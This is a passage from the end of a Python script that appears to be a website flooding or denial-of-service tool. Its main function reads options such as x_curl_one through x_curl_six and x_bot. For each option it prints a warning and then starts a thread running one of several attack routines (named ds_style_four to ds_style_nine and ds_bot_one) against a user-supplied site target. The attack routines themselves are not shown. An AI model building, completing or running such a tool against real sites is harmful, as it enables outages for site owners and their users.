            site_target = str(arq_run.x_curl_one).replace(" ","")
            the_4 = threading.Thread(target=ds_style_four,args=(site_target, ))
            the_4.start()
        elif arq_run.x_curl_two:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_curl_two).replace(" ","")
            the_5 = threading.Thread(target=ds_style_five,args=(site_target, ))
            the_5.start()
        elif arq_run.x_curl_three:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_curl_three).replace(" ","")
            the_6 = threading.Thread(target=ds_style_six,args=(site_target, ))
            the_6.start()
        elif arq_run.x_curl_four:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_curl_four).replace(" ","")
            the_7 = threading.Thread(target=ds_style_seven,args=(site_target, ))
            the_7.start()
        elif arq_run.x_curl_five:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_curl_five).replace(" ","")
            the_8 = threading.Thread(target=ds_style_eight,args=(site_target, ))
            the_8.start()
        elif arq_run.x_curl_six:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_curl_six).replace(" ","")
            the_9 = threading.Thread(target=ds_style_nine,args=(site_target, ))
            the_9.start()
        elif arq_run.x_bot:
            show_warning()
            time.sleep(4.2)
            site_target = str(arq_run.x_bot).replace(" ","")
            bot_1 = threading.Thread(target=ds_bot_one,args=(site_target, ))
            bot_1.start()
        elif arq_run.x_help:
            show_info()
            pass
        else:
            show_info()
            pass
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("SOMETHING IS WRONG/CHECK YOUR SYSTEM AND TRY AGAIN"))
        pass
        
        
    
if __name__ == "__main__":
    try:
        main_running()
    except:
        show_info()
        pass
